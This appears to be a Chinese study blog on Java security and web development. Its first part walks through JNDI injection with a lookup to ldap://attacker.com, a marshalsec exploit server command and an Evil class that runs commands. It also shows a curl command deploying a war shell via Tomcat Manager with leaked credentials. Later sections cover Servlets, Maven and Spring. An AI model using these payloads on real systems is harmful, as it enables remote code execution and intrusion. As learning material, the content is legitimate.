<p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/18.PNG" class="lazyload" data-srcset="18.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
<p>可以看到ldap对应的安全措施并非强制的。这点非常有意思。进而延伸到我们下面的一个特点</p>
<p>jndi在初始化时,一定要像demo中那样配置上下文环境。</p>
<pre><code class="java">Properties env = new Properties();
env.put(Context.INITIAL_CONTEXT_FACTORY,&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);
env.put(Context.PROVIDER_URL,&quot;rmi://localhost:1099&quot;);
Context ctx = new InitialContext(env);



LocateRegistry.createRegistry(6666);
System.setProperty(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);
System.setProperty(Context.PROVIDER_URL, &quot;rmi://localhost:6666&quot;);
InitialContext ctx = new InitialContext();</code></pre>
<p>上面两种方式都可以指定上下文。但是当我们使用lookup()寻找对象时,我们可以用其他格式的协议来转换上下文环境访问对象。具体可以跟到InitialContext类的getURLOrDefaultInitCtx</p>
<pre><code class="java">protected Context getURLOrDefaultInitCtx(String name)
        throws NamingException {
        if (NamingManager.hasInitialContextFactoryBuilder()) {
            return getDefaultInitCtx();
        }
        String scheme = getURLScheme(name);
        if (scheme != null) {
            Context ctx = NamingManager.getURLContext(scheme, myProps);
            if (ctx != null) {
                return ctx;
            }
        }
        return getDefaultInitCtx();
    }</code></pre>
<p>可以看到如果协议不为空,会重新获取url中指定的环境。<br>所以可以传递<code>ctx.lookup(&quot;ldap://attacker.com:12345/ou=foo,dc=foobar,dc=com&quot;);</code>这样的url来进行lookup.(幸好之前做htb好好学了下ldap……).这就是jndi的动态协议转换特性。</p>
<ul>
<li>jndi injection</li>
</ul>
<p>终于到我们攻击的重头戏jndi注入了。不过在正式开始前我们还需要了解下Reference类的使用</p>
<blockquote>
<p>Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等</p>
</blockquote>
<p>几个比较关键的属性：</p>
<p>1.className：远程加载时所使用的类名<br>2.classFactory：加载的class中需要实例化类的名称<br>3.classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file/ftp/http等协议</p>
<p>所以我们开始jndi注入时,就可以使用到Reference类的功能了。jndi中对象的传递可以使用序列化也可以使用引用。那么假如我们能将恶意的Reference类绑定在RMI注册表中,并试其引用指向恶意class.就能达成命令执行。(前提:当用户在JNDI客户端的lookup()函数参数外部可控或Reference类构造方法的classFactoryLocation参数外部可控时)</p>
<p>复现的话因为我本地java版本的问题导致不能用基础的jndi注入payload打。不过之前我复现过<a href="https://bycsec.top/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/#fastjson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E" target="_blank" rel="noopener">fastjson</a>的洞。用的就是rmi的服务</p>
<p>方法,对应jdk1.8以下的,直接用rmi做</p>
<p>JndiClient</p>
<pre><code class="java">import javax.naming.Context;
import javax.naming.InitialContext;

public class JndiClient {
    public static void main(String[] args) throws Exception{
        String uri = &quot;rmi://127.0.0.1:1099/aa&quot;;//可控
        Context ctx = new InitialContext();
        ctx.lookup(uri);
    }
}</code></pre>
<p>用marshalsec起一个rmi服务<br><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://localhost:8000/#Evil</code></p>
<p>准备的Evil.java <code>javac Evil.java</code>编译好.并起一个python web服务监听在对应的端口</p>
<pre><code class="java">public class Evil {
    public Evil() throws Exception {
        Runtime rt = Runtime.getRuntime();
        String[] commands = {&quot;touch&quot;,&quot;/tmp/a&quot;};
        Process pc = rt.exec(commands);
        pc.waitFor();
    }
}</code></pre>
<p>不过我因为版本问题所以都失败了。可以看到其抛出的com.sun.jndi.rmi.object.trustURLCodebase错误。<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/19.PNG" class="lazyload" data-srcset="19.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
<p>这也就是为什么上面提到说ldap。LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被设置为false，对LDAP Reference远程工厂类的加载增加了限制。</p>
<p>我们换用ldap的命令试试</p>
<p>CLIENT.java</p>
<pre><code class="java">import javax.naming.Context;
import javax.naming.InitialContext;
import javax.swing.*;

public class CLIENT {

    public static void main(String[] args) throws Exception {
        String uri = &quot;ldap://127.0.0.1:1389/aa&quot;;
        Context ctx = new InitialContext();
        ctx.lookup(uri);
    }
}</code></pre>
<p>marshalsec起服务。evil.class准备弹shell<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/20.PNG" class="lazyload" data-srcset="20.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>成功执行命令。可以看到ldap的版本使用范围确实比rmi更广。</p>
<p>这里还有一个<a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">绕过高版本的jndi注入</a>。属于进阶技巧了。暂时先留个坑。等遇到再填。</p>
<h2 id="develop"><a href="#develop" class="headerlink" title="develop"></a>develop</h2><p>上面基本上是把java的一些比较基础的漏洞或多或少复现并分析了一遍。感觉接触起来还是挺有意思的。不过按照之前的计划,现在要把java_web的知识更深入了解下。方便自己以后更熟悉文件结构或者相应的方法,同时也是为了开发做进一步考虑。至于java一些常见漏洞如jackson,fastjson以及其他一些框架如struts的漏洞等等方向的深入就留到后面其他文章里记录了。</p>
<h3 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h3><p>web资源想要被远程计算机访问,都需要一个与之进行网络通信的程序。web服务器就是这样的程序。对java而言,支持全部JSP以及Servlet规范的tomcat服务器是最好的选择。tomcat的下载安装就不多赘述了。按照教程走就好。</p>
<p>这里对tomcat的一些细节进行叙述</p>
<ul>
<li><code>$CATALINA_HOME</code></li>
</ul>
<p>tomcat的根目录。我们也可以通过配置<code>$CATALINA_BASE</code>,为多个tomcat实例的个体设定对应的属性。</p>
<ul>
<li>path</li>
</ul>
<p>/bin<br>存放用于启动及关闭的文件，以及其他一些脚本。其中，UNIX 系统专用的 *.sh 文件在功能上等同于 Windows 系统专用的 *.bat 文件</p>
<p>/conf<br>配置文件及相关的 DTD。其中最重要的文件是 server.xml，这是容器的主配置文件<br>当然其他一些文件也很重要。个人遇到过的还有catalina.policy,tomcat-users.xml,web.xml这几个重要配置文件。</p>
<p>/log<br>日志文件的默认目录。</p>
<p>/webapps<br>存放 Web 应用的相关文件。</p>
<ul>
<li>应用部署</li>
</ul>
<p>在 Tomcat 服务器上，可以通过多种方法部署 Web 应用:1.静态部署2.动态部署</p>
<p>静态部署我们应该很熟悉。就是常规的开发流程。在启动之前就写好web应用。但是动态部署可能就接触的相对较少。但其实就是使用tomcatmanager直接操作管理web应用。</p>
<p>关于tomcat manager要等到专门讲manager时再仔细理解。</p>
<ul>
<li>上下文</li>
</ul>
<p>上下文在 Tomcat 中其实就是 Web 应用的意思。<br>为了在 Tomcat 中配置上下文，需要用到上下文描述符文件。在tomcat中其实就是xml文件。<br>上下文描述符文件位于：<br>1.<code>$CATALINA_BASE/conf/[enginename]/[hostname]/[webappname].xml</code><br>2.<code>$CATALINA_BASE/webapps/[webappname]/META-INF/context.xml</code><br>在目录 1 中的文件名为 <code>[webappname].xml</code>，但在目录 2 中，文件名为 context.xml。如果某个 Web 应用没有相应的上下文描述符文件，Tomcat 就会使用默认值配置该应用。</p>
<ul>
<li>Tomcat Manager</li>
</ul>
<p>很多生产环境都非常需要以下特性：在无需关闭或重启整个容器的情况下，部署新的 Web 应用或者取消对现有应用的部署。或者，即便在 Tomcat 服务器配置文件中没有指定 reloadable 的情况下，也可以请求重新加载现有应用。</p>
<p>Tomcat 中的 Web 应用 Manager 就是来解决这些问题的，它默认安装在上下文路径：/manager 中</p>
<p>Tomcat 以默认值运行是非常危险的，因为这能让互联网上的任何人都可以在你的服务器上执行 Manager 应用。因此，Manager 应用要求任何用户在使用前必须验证自己的身份，提供自己的用户名和密码，以及相应配置的 manager-** 角色（角色名称根据所需的功能而定）。另外，默认用户文件（$CATALINA_BASE/conf/tomcat-users.xml）中的用户名称都没有指定角色名称，所以默认是不能访问 Manager 应用的。</p>
<p>这些角色名称位于 Manager 应用的 web.xml 文件中。可用的角色包括：</p>
<blockquote>
<p>manager-gui 能够访问 HTML 界面。<br>manager-status 只能访问“服务器状态”（Server Status）页面。<br>manager-script 能够访问文档中描述的适用于工具的纯文本界面，以及”服务器状态”页面。<br>manager-jmx 能够访问 JMX 代理界面以及“服务器状态”（Server Status）页面。</p>
</blockquote>
<p>为了能够访问 Manager 应用，必须创建一个新的用户名/密码组合，并为之授予一种 manager-** 角色，或者把一种 manager-** 角色授予现有的用户名/密码组合</p>
<p>比较危险的情况就如之前曾经做过几次的java题中出现的tomcat弱密码部署war或者tomcat密码泄露,命令行部署war的情况一样。</p>
<p>注意一点,tomcat支持通过请求url进行命令执行。<br><code>http://{host}:{port}/manager/text/{command}?{parameters}</code></p>
<p>比如我做过的htb某靶机中,用户密码泄露了。但是用户是admin-gui,manager-script权限,我们没法通过账户密码登录<code>manager/html</code>手动部署war.但是却可以通过命令行来部署war getshell.</p>
<pre><code class="bash">curl --user &#39;tomcat:xxxx&#39; --upload-file exp.war &quot;http://xxxx:8080/manager/text/deploy=/exp.war&quot;</code></pre>
<p>这样就可以通过访问web目录exp直接操作shell了。</p>
<ul>
<li>安全管理</li>
</ul>
<p>Java 的 SecurityManager 能让 Web 浏览器在它自身的沙盒中运行小型应用（applet），从而具有防止不可信代码访问本地文件系统的文件以及防止其连接到主机，而不是加载该应用的位置。<br>SecurityManager 能防止不可信的小型应用在你的浏览器上运行，运行 Tomcat 时，使用 SecurityManager 也能保护服务器，使其免受木马型的 applet、JSP、JSP Bean 以及标签库的侵害，甚至也可以防止由于无意中的疏忽所造成的问题。</p>
<p>关于适用于 Tomcat 的标准系统 SecurityManager 权限类.包括但不限于：<br>1.java.lang.RuntimePermission——控制一些系统/运行时函数的使用，比如 exit() 和 exec()。 另外也控制包的访问/定义。<br>2.java.io.FilePermission——控制对文件和目录的读/写/执行。<br>3.java.security.AllPermission——允许访问任何权限，仿佛没有 SecurityManager。<br>……</p>
<p>其对应的策略文件就是catalina.policy。</p>
<h3 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h3><p>Servlet算是javaweb比较特色的程序了。它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。从某种角度讲,他能跟php做到的功能近乎类似。Java 类库的全部功能对 Servlet 来说都是可用的。它可以通过 sockets 和 RMI 机制与 applets、数据库或其他软件进行交互。</p>
<ul>
<li>Life Cycle</li>
</ul>
<p>Servlet的生命周期可被定义为从创建直到毁灭的整个过程。以下是 Servlet 遵循的过程：</p>
<p>1.通过调用 init () 方法进行初始化。<br>2.调用 service() 方法来处理客户端的请求。<br>3.通过调用 destroy() 方法终止（结束）。<br>最后，Servlet 是由 JVM 的垃圾回收器进行垃圾回收的。</p>
<p>init()可理解为初始化,但不是构造方法。(java构造方法必须是跟类名同名的)一般进行简单的参数设定。</p>
<p>service()用来处理客户端请求并将格式化的响应返回给客户端。我们通常并不需要对这个方法进行改善,而是重写其调用的<code>doGet</code>,<code>doPost</code>等方法。</p>
<p>doGet(),doPost()格式均如下：</p>
<pre><code class="java">public void [doGet or doPost](HttpServletRequest request,HttpServletResponse response)
    throws ServletException, IOException {
    // Servlet code
}</code></pre>
<p>destroy() 方法只会被调用一次，在 Servlet 生命周期结束时被调用。destroy() 方法可以让您的 Servlet 关闭数据库连接、停止后台线程、把 Cookie 列表或点击计数器写入到磁盘，并执行其他类似的清理活动。<br>在调用 destroy() 方法之后，servlet 对象被标记为垃圾回收</p>
<ul>
<li>部署</li>
</ul>
<p>这一部分应该算是web开发的基本流程了,因为以前只是审过源码,所以在实际使用idea进行项目创建以及内容编写上还是得重新来过。</p>
<p>流程:idea创建javaEnterprise项目并选择Additional Library中的Web Application. =&gt; 在新建项目下的web/WEB-INF目录下新建lib,src,classes三个文件夹 =&gt; 更改项目结构：</p>
<p>1.src 可以在Project Structure的modules中重新设置source.我们需要把Sources从原工程的src改为WEB-INF下的src.Sources 一般用于标注类似 src 这种可编译目录。有时候我们不单单项目的 src 目录要可编译，还有其他一些特别的目录也许我们也要作为可编译的目录，就需要对该目录进行此标注。只有 Sources 这种可编译目录才可以新建 Java 类和包。(此处工程自己创建的src没用了，所以我们直接改成web目录下的源文件夹)<br>2.classes 用来存放编译后输出的class文件.我们同样在项目结构中Paths的配置里将Output path和Test output path都选择刚刚创建的classes文件夹。<br>3.lib用于外部jar包。由于我们开发时必然会用到外部依赖,所以存放jar包的lib也需要在项目中设置。我们同样在modules中把lib添加为jar directory即可。</p>
<p>然后是配置tomcat服务器,这个没啥好说的。不过还是要注意<code>artifact</code>设置根目录的要点。通常设置为<code>/</code>.</p>
<p>Servlet编写的一个demo.我们首先要在之前更改过的src下新建一个class<br>(虽然idea会自动换成.java)命名随意。不过最好是某某Servlet.</p>
<pre><code class="java">import java.io.*;
import javax.servlet.*;
import javax.servlet.http.*;


public class TestServlet extends HttpServlet{

    private String quote;

    public  TestServlet(){
        System.out.println(&quot;TestServlet constructor called.&quot;);
    }
    @Override
    public void init() throws ServletException {
        System.out.println(&quot;TestServlet init method called&quot;);
        quote=&quot;Thy will , not my will , be done.&quot;;
    }

    @Override
    public void destroy() {
        System.out.println(&quot;TestServlet destroy method called&quot;);
    }


    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        resp.setContentType(&quot;json&quot;);
        PrintWriter out=resp.getWriter();
        out.println(&quot;{\&quot;quote\&quot;:\&quot;&quot;+quote+&quot;\&quot;}&quot;);
    }
}</code></pre>
<p>这里顺手写了构造方法看看调用顺序。虽然我们都知道构造方法必然是最先调用的，其次是init(),然后是我们每次访问时调用的doGet,最后destroy销毁。</p>
<p>然后我们build module。在WEB-INF下的classes中生成TestServlet.class.最后就是配置web.xml了。</p>
<blockquote>
<p>默认情况下，Servlet 应用程序位于路径 <Tomcat-installation-directory>/webapps/ROOT 下，且类文件放在 <Tomcat-installation-directory>/webapps/ROOT/WEB-INF/classes 中。<br>如果有一个完全合格的类名称 com.myorg.MyServlet，那么这个 Servlet 类必须位于 WEB-INF/classes/com/myorg/MyServlet.class 中。位于 <Tomcat-installation-directory>/webapps/ROOT/WEB-INF/ 的 web.xml 文件中必须设置Servlet的相关条目。</Tomcat-installation-directory></Tomcat-installation-directory></Tomcat-installation-directory></p>
</blockquote>
<p>所以路径结构规定其实非常清晰。接下来我们只需要设置web.xml</p>
<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;
         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;
         version=&quot;4.0&quot;&gt;
    &lt;servlet&gt;
        &lt;servlet-name&gt;test&lt;/servlet-name&gt;
        &lt;servlet-class&gt;TestServlet&lt;/servlet-class&gt;
    &lt;/servlet&gt;

    &lt;servlet-mapping&gt;
        &lt;servlet-name&gt;test&lt;/servlet-name&gt;
        &lt;url-pattern&gt;/Test&lt;/url-pattern&gt;
    &lt;/servlet-mapping&gt;
&lt;/web-app&gt;</code></pre>
<p>可设定对应的servlet-class并定义其servletname.同时可以定义这个servlet对应的url映射。</p>
<p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/21.PNG" class="lazyload" data-srcset="21.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
<p>剩下的部分就跟其他语言差不多了,使用get,post等处理参数,cookie及相应http请求。这里稍微记录下sql连接的使用方法。</p>
<pre><code class="java">static final String JDBC_DRIVER = &quot;com.mysql.jdbc.Driver&quot;;  
static final String DB_URL = &quot;jdbc:mysql://localhost:3306/test&quot;;

static final String USER = &quot;root&quot;;
static final String PASS = &quot;123456&quot;; 
...
...
Class.forName(&quot;com.mysql.jdbc.Driver&quot;);
conn = DriverManager.getConnection(DB_URL,USER,PASS);
...
...
mt = conn.createStatement();
String sql;
sql = &quot;SELECT id, name, url FROM websites&quot;;
ResultSet rs = stmt.executeQuery(sql);
...
...
rs.close();
stmt.close();
conn.close();</code></pre>
<h3 id="maven"><a href="#maven" class="headerlink" title="maven"></a>maven</h3><p>之前使用ysoserial跟marshalsec时想必必然用过maven了。但是实际上maven的作用究竟是什么还是一头雾水。因此针对maven也来学习下。</p>
<ul>
<li>what is maven<br>Maven 翻译为”专家”、”内行”，是 Apache 下的一个纯 Java 开发的开源项目。基于项目对象模型（缩写：POM）概念，Maven利用一个中央信息片断能管理一个项目的构建、报告和文档等步骤。</li>
</ul>
<p>Maven 是一个项目管理工具，可以对 Java 项目进行构建、依赖管理。</p>
<p>环境配置只要jdk+下载maven即可。当然我记得IDEA应该是有maven的功能的。</p>
<ul>
<li>POM</li>
</ul>
<p>POM 即 project object model.是一个xml文件，同时也是maven工程的基本单元。包含了项目的基本信息，用于描述项目如何构建，声明项目依赖，等等。</p>
<p>一个pom.xml的demo</p>
<pre><code class="xml">&lt;project xmlns = &quot;http://maven.apache.org/POM/4.0.0&quot;
    xmlns:xsi = &quot;http://www.w3.org/2001/XMLSchema-instance&quot;
    xsi:schemaLocation = &quot;http://maven.apache.org/POM/4.0.0
    http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;

    &lt;!-- 模型版本 --&gt;
    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
    &lt;!-- 公司或者组织的唯一标志，并且配置时生成的路径也是由此生成， 如com.companyname.project-group，maven会将该项目打成的jar包放本地路径：/com/companyname/project-group --&gt;
    &lt;groupId&gt;com.companyname.project-group&lt;/groupId&gt;

    &lt;!-- 项目的唯一ID，一个groupId下面可能多个项目，就是靠artifactId来区分的 --&gt;
    &lt;artifactId&gt;project&lt;/artifactId&gt;

    &lt;!-- 版本号 --&gt;
    &lt;version&gt;1.0&lt;/version&gt;
&lt;/project&gt;</code></pre>
<p>常见的节点理解</p>
<p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/22.PNG" class="lazyload" data-srcset="22.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
<ul>
<li>Super POM<blockquote>
<p>父（Super）POM是 Maven 默认的 POM。所有的 POM 都继承自一个父 POM（无论是否显式定义了这个父 POM）。父 POM 包含了一些可以被继承的默认设置。因此，当 Maven 发现需要下载 POM 中的 依赖时，它会到 Super POM 中配置的默认仓库 <a href="http://repo1.maven.org/maven2" target="_blank" rel="noopener">http://repo1.maven.org/maven2</a> 去下载。</p>
</blockquote>
</li>
</ul>
<p>更多pom标签的含义在遇到实际情况再作说明。</p>
<ul>
<li>Life Cycle</li>
</ul>
<p>Maven 构建生命周期定义了一个项目构建跟发布的过程.其主要的三个生命周期是<code>clean</code>,<code>default/build</code>,<code>site</code>.</p>
<p>常用命令如<code>mvn clean</code>执行的其实是两个生命周期阶段<code>pre-clean,clean</code>.换成<code>mvn post-clean</code>则会都执行一遍即三个阶段。</p>
<pre><code>pre-clean：执行一些需要在clean之前完成的工作
clean：移除所有上一次构建生成的文件
post-clean：执行一些需要在clean之后立刻完成的工作</code></pre><p>我们可以通过控制pom.xml来决定mvn clean时每个阶段的动作。</p>
<ul>
<li>maven repos</li>
</ul>
<p>maven仓库是项目中依赖的第三方库。其主要是存储jar的地方。因此我们可以构建本地的maven项目。当然也可以有远程与默认的仓库。</p>
<p>比如使用aliyun仓库。我们可以在maven的setting中更改setting.xml添加节点。</p>
<pre><code class="xml">&lt;mirrors&gt;
    &lt;mirror&gt;
      &lt;id&gt;alimaven&lt;/id&gt;
      &lt;name&gt;aliyun maven&lt;/name&gt;
      &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt;
      &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;        
    &lt;/mirror&gt;
&lt;/mirrors&gt;</code></pre>
<p>pom.xml中添加</p>
<pre><code class="xml">&lt;repositories&gt;  
        &lt;repository&gt;  
            &lt;id&gt;alimaven&lt;/id&gt;  
            &lt;name&gt;aliyun maven&lt;/name&gt;  
            &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt;  
            &lt;releases&gt;  
                &lt;enabled&gt;true&lt;/enabled&gt;  
            &lt;/releases&gt;  
            &lt;snapshots&gt;  
                &lt;enabled&gt;false&lt;/enabled&gt;  
            &lt;/snapshots&gt;  
        &lt;/repository&gt;  
&lt;/repositories&gt;</code></pre>
<p>这个可能算是比较重要的一点了。因为大部分idea自带的maven或者是默认下载的maven配置中settings.xml都会去国外仓库获取资源，导致速度奇慢。</p>
<ul>
<li>develop</li>
</ul>
<p>下面就可以开始正式maven项目的开发了。似乎idea直接创造maven project有一些坑要踩。所以我先按照菜鸟教程上的走。</p>
<p>在开始之前，先确认把仓库的设置改好了。即选择了aliyun镜像.然后idea的配置中:<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/23.PNG" class="lazyload" data-srcset="23.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
<p>然后用命令行构建一个项目。此处我命命为maven_learning</p>
<pre><code>mvn archetype:generate &quot;-DgroupId=com.byc.test&quot; &quot;-DartifactId=mvn_learning&quot; &quot;-DarchetypeArtifactId=maven-archetype-quickstart&quot; &quot;-DinteractiveMode=false&quot;</code></pre><p>之后在idea中导入这个工程即可。<br>目录结构<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/24.PNG" class="lazyload" data-srcset="24.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>test跟java分别是java代码文件跟测试代码文件。都在包结构下。</p>
<p>这里我们初始的pom.xml中主要是这样的内容</p>
<pre><code class="xml">&lt;dependencies&gt;
    &lt;dependency&gt;
      &lt;groupId&gt;junit&lt;/groupId&gt;
      &lt;artifactId&gt;junit&lt;/artifactId&gt;
      &lt;version&gt;3.8.1&lt;/version&gt;
      &lt;scope&gt;test&lt;/scope&gt;
    &lt;/dependency&gt;
  &lt;/dependencies&gt;</code></pre>
<p>说明Maven 已经添加了 JUnit 作为测试框架</p>
<p>初始的App.java是一个Hello world的用例</p>
<pre><code class="java">package com.byc.test;

/**
 * Hello world!
 *
 */
public class App 
{
    public static void main( String[] args )
    {
        System.out.println( &quot;Hello World!&quot; );
    }
}</code></pre>
<p>接下来我们需要build maven项目。使用clean package</p>
<pre><code>mvn clean package</code></pre><p>成功后。我们会发现生成了target文件夹。并且其中有我们项目构建的jar file。<br>新增目录结构</p>
<pre><code>我们给了 maven 两个目标，首先清理目标目录（clean），然后打包项目构建的输出为 jar（package）文件。
打包好的 jar 文件可以在target中获得
测试报告存放在surefire-reports文件夹中
Maven 编译源码文件，以及测试源码文件。
接着 Maven 运行测试用例。
最后 Maven 创建项目包。</code></pre><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/25.PNG" class="lazyload" data-srcset="25.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
<p>classes文件夹下使用<code>java -cp . com.byc.test.App</code>即可调用Hello world.</p>
<p>这是一个简单的maven项目构建过程。如果要使用外部依赖进行web相关开发,只需依照目录结构进行补充即可。假如我们需要添加一个ldapjdk.jar作为依赖。还是老样子将其拖到工程的lib文件夹下,并在pom.xml中添加</p>
<pre><code class="xml">&lt;dependencies&gt;
    &lt;!-- 在这里添加你的依赖 --&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;ldapjdk&lt;/groupId&gt;  &lt;!-- 库名称，也可以自定义 --&gt;
        &lt;artifactId&gt;ldapjdk&lt;/artifactId&gt;    &lt;!--库名称，也可以自定义--&gt;
        &lt;version&gt;1.0&lt;/version&gt; &lt;!--版本号--&gt;
        &lt;scope&gt;system&lt;/scope&gt; &lt;!--作用域--&gt;
        &lt;systemPath&gt;${basedir}\src\lib\ldapjdk.jar&lt;/systemPath&gt; &lt;!--项目根目录下的lib文件夹下--&gt;
    &lt;/dependency&gt; 
&lt;/dependencies&gt;</code></pre>
<p>这里一开始想用ideabuild maven项目时发现报错。查了下发现可能是自己jdk版本跟idea的不一致的原因。(为了burp使用jdk1.8,但最早学编程时用的jdk10)所以最好保证maven生成构建项目时的一致性<br>(做htb某靶机中遇到了maven build失败的情况,最后解决办法是在更改了语言level后同时还在pom.xml中加入maven版本,jdk版本才完美解决)</p>
<h3 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h3><p>emm没错又从maven跳到spring了。大概是因为spring框架出现的频率还是算比较高的。并且还不能简单的按照servlet开发的流程理解。所以先学习下spring的基础知识。</p>
<ul>
<li>what is spring</li>
</ul>
<p>轻量级的Java Web开发框架，以IOC,AOP为内核，使用基本的JavaBean完成以前只可能由EJB完成的工作，取代了EJB臃肿和低效的开发模式。</p>
<p>spring框架采用分层结构。可分为Data Access/Integration、Web、AOP、Aspects、Messaging、Instrumentation、Core Container和Test。</p>
<p>其中core container 核心容器包含几个模块</p>
<blockquote>
<p>Core模块：提供了框架的基本组成部分，包括IoC和依赖注入功能；<br>Beans模块 ：提供BeanFactory，是工厂模式的经典实现，Spring将管理对象称为Bean；<br>Context模块：是在Core和Beans模块的基础上建立起来的，以一种类似于JNDI注册的方式访问对象，是访问定义和配置任何对象的媒介。ApplicationContext接口是上下文模块的焦点；<br>SpEL模块：提供了强大的表达式语言，用于在运行时查询和操作对象图；</p>
</blockquote>
<p>其他如Data Access/Integration 包含jdb，orm等模块。Web包含Servlet,MVC等模块。暂且不提。</p>
